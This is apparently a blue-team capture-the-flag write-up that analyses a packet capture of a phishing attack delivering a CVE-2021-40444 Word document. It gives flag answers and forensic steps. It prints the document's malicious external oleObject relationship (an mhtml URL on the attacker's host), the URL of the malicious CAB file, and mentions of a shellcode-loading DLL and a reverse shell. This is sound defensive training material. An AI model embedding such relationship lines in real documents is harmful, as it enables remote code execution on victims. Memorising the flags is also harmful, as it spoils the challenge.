# Challenge Report for BSidesJeddah-Part1

- **Challenge Name: [BSidesJeddah-Part1]**
- **Date: [11/04/2022]**
- **URL: [https://cyberdefenders.org/blueteam-ctf-challenges/81]**
- **Status:[Active]**

***

## Description

As a security consultant, a phishing attack attributed to a popular APT group targeted one of your customers.  Given the provided PCAP trace, analyze the attack and answer challenge questions.

## Tools Used

- BrimSecurity
- suricatarunner
- NetworkMiner
- WireShark
- IDA
- MAC address lookup
- outlook
- VirusTotal
- scdbg
- HxD

## Analysis

1. What is the victim's MAC address?

    **Flag:00:0c:29:b7:ca:91**

    IP of victim is obvoiusly 192.168.112.139.  Pick a packet in Wirehark and check the Ethernet II section.

2. What is the address of the company associated with the victim's machine MAC address?

    **Flag:3401 Hillview Avenue Palo Alto CA 94304 US**

    <https://maclookup.app/search/result?mac=00%3A0c%3A29%3Ab7%3Aca%3A91>

3. What is the attacker's IP address?

    **Flag:192.168.112.128**

4. What is the IPv4 address of the DNS server used by the victim machine?

    **Flag: 192.168.112.2**

    Brim -> Search for "DNS"

5. What domain is the victim looking up in packet 5648?

    **Flag: omextemplates.content.office.net**

    Pull up packet 5648 in Wireshark and look at Domain Name System -> Queries

6. What is the server certificate public key that was used in TLS session: 731300002437c17bdfa2593dd0e0b28d391e680f764b5db3c4059f7abadbb28e

    **Flag: 64089e29f386356f1ffbd64d7056ca0f1d489a09cd7ebda630f2b7394e319406**

    Wireshark filter: tls.handshake.session_id == 73:13:00:00:24:37:c1:7b:df:a2:59:3d:d0:e0:b2:8d:39:1e:68:0f:76:4b:5d:b3:c4:05:9f:7a:ba:db:b2:8e
    Then look under Handshake Protocol: Server Key Exchange -> EC Diffie-Hellman Server Params -> Pubkey

7. What domain is the victim connected to in packet 4085?

    **Flag:v10.vortex-win.data.microsoft.com**

    Follow the conversation in Wireshark.

8. The attacker conducted a port scan on the victim machine. How many open ports did the attacker find?

    **Flag: 7**

    In Brim: _path=="conn" id.orig_h==192.168.112.128 id.resp_h==192.168.112.139 | sort -r resp_ip_bytes

    And then count uniq ports that responded.

9. Analyze the pcap using the provided rules. What is the CVE number falsely alerted by Suricata?

    **Flag:CVE-2020-11899**

10. What is the command parameter sent by the attacker in packet number 2650?

    **Flag:kali**

    Packet 2650 is connecting to a email server.

    ```text
    Command Line: EHLO kali\r\n
    Command: EHLO
    Request parameter: kali
    ```

11. What is the stream number which contains email traffic?

    **Flag:1183**

    Select patcket 2650 and follow.  Check the filter.

12. What is the victim's email address?

    **Flag: joshua@cyberdefenders.org**

    It's in the follow from question 11.

    ```text
    To: "joshua@cyberdefenders.org" <joshua@cyberdefenders.org>
    Subject: Immediate respones
    Date: Fri, 1 Oct 2021 12:31:54 +0000
    ```

13. What was the time attacker sent the email?

    **Flag: 12:31:54**

    It's in the follow from question 11.

    ```text
    To: "joshua@cyberdefenders.org" <joshua@cyberdefenders.org>
    Subject: Immediate respones
    Date: Fri, 1 Oct 2021 12:31:54 +0000
    ```

14. What is the version of the program used to send the email?

    **Flag: 1.56**

    It's in the follow from question 11.

    ```text
    X-Mailer: sendEmail-1.56
    ```

15. What is the MD5 hash of the email attachment?

    **Flag: 55e7660d9b21ba07fc34630d49445030**

    Copy base64 doc out of the followed conversation from question 11 to a file and then...

    ```bash
    $ base64 -d word_doc.base64 > "web server.docx"
    $ md5sum web\ server.docx 
    55e7660d9b21ba07fc34630d49445030  web server.docx
    ```

16. What is the CVE number the attacker tried to exploit using the malicious document?

    **Flag: CVE-2021-40444**

    Upload file to Virus Total.

17. The malicious document file contains a URL to a malicious HTML file. Provide the URL for this file.

    **Flag: <http://192.168.112.128/word.html>**

    ```bash
    $ zipdump.py web\ server.docx
    Index Filename                     Encrypted Timestamp           
        1 [Content_Types].xml                  0 2021-10-01 14:10:34 
        2 _rels/                               0 2021-10-01 14:10:34 
        3 _rels/.rels                          0 2021-10-01 14:10:34 
        4 docProps/                            0 2021-10-01 14:10:34 
        5 docProps/app.xml                     0 2021-10-01 14:10:34 
        6 docProps/core.xml                    0 2021-10-01 14:10:34 
        7 word/                                0 2021-10-01 14:10:34 
        8 word/document.xml                    0 2021-10-01 14:10:34 
        9 word/_rels/                          0 2021-10-01 14:10:34 
    10 word/_rels/document.xml.rels         0 2021-10-01 14:10:34 
    11 word/webSettings.xml                 0 2021-10-01 14:10:34 
    12 word/settings.xml                    0 2021-10-01 14:10:34 
    13 word/styles.xml                      0 2021-10-01 14:10:34 
    14 word/theme/                          0 2021-10-01 14:10:34 
    15 word/theme/theme1.xml                0 2021-10-01 14:10:34 
    16 word/fontTable.xml                   0 2021-10-01 14:10:34 
    sansforensics@siftworkstation: ~/VMShared/cyberdefenders.org/c62-bsidesjeddah-pcap/webserver.docx
    $ zipdump.py -s10  web\ server.docx -d | re-search.py -u -n url -F officeurls
    http://192.168.112.128/word.html!x-usc:http://192.168.112.128/word.html
    ```

18. What is the LinkType of the OLEObject related to the relationship which contains the malicious URL?

    **Flag:EnhancedMetaFile**

    ```bash
    $ zipdump.py -s10  web\ server.docx -d | xmldump.py pretty
    <?xml version="1.0" ?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
        <Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
        <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/>
        <Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/>
        <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/>
        <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
        <Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://192.168.112.128/word.html!x-usc:http://192.168.112.128/word.html" TargetMode="External"/>
        <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.wmf"/>
        <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/>
    </Relationships>
    $ egrep -roh '"rId6".*<o:LinkType>(.*)<\/o:LinkType>' *
    "rId6" UpdateMode="OnCall"><o:LinkType>EnhancedMetaFile</o:LinkType>
    ```

19. What is the Microsoft Office version installed on the victim machine?

    **Flag:﹡﹡.﹡.﹡﹡﹡﹡**

20. The malicious HTML contains a js code that points to a malicious CAB file. Provide the URL to the CAB file?

    **Flag: <http://192.168.112.128/word.cab>**

    In Wireshark go to File -> Export Objects -> Http and find the cab.  Follow the stream.

21. The exploit takes advantage of a CAB vulnerability. Provide the vulnerability name?

    **Flag:﹡﹡﹡﹡﹡﹡﹡**

22. The CAB file contains a malicious dll file. What is the tool used to generate the dll?

    **Flag:﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡**

23. What is the path of the dropped malicious dll file? Replace your username with IEUser

    **Flag:﹡:\﹡﹡﹡﹡﹡\﹡﹡﹡﹡﹡﹡\﹡﹡﹡﹡﹡﹡﹡\﹡﹡﹡﹡﹡\﹡﹡﹡﹡\﹡﹡﹡﹡﹡﹡.﹡﹡﹡**

24. Analyzing the dll file what is the API used to write the shellcode in the process memory?

    **Flag:﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡﹡**

25. Extracting the shellcode from the dll file. What is the name of the library loaded by the shellcode?

    **Flag:﹡﹡﹡﹡﹡﹡﹡**

26. Which port was configured to receive the reverse shell?

    **Flag:﹡﹡﹡**

## Lessons Learned
